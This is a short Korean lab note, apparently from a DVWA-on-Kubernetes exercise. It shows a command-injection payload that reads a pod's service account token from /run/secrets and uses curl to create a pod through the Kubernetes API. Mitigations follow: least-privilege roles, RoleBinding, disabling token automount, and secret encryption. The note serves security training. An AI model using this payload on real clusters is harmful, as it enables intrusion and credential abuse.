# 공격 시나리오
* serviceAccount 토큰을 사용하여 쿠버네티스 pod 생성


# 공격 방법

* default namespace에 nginx pod를 생성

```sh
127.0.0.1 -c 1 && cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" -d '{"apiVersion":"v1","kind":"Pod","metadata":{"name":"nginx","namespace":"default"},"spec":{"containers":[{"name":"nginx","image":"nginx:latest","ports":[{"containerPort":80}]}]}}' https://kubernetes.default.svc.cluster.local/api/v1/namespaces/default/pods; }
```

# 보안조치
* [role](./manifests/dvwa_webapp/clusterrole.yaml)에서 필요한 권한(최소권한)만 설정
* [clusterrole binding](./manifests/dvwa_webapp/clusterrolebinding.yaml)를 rolebinding으로 변경 -> 다른 namespace 접근 불가
* token이 불필요하면 automountServiceAccountToken을 false로 설정
* secret 데이터는 암호화해서 저장(써드파티 사용, 예: vault)
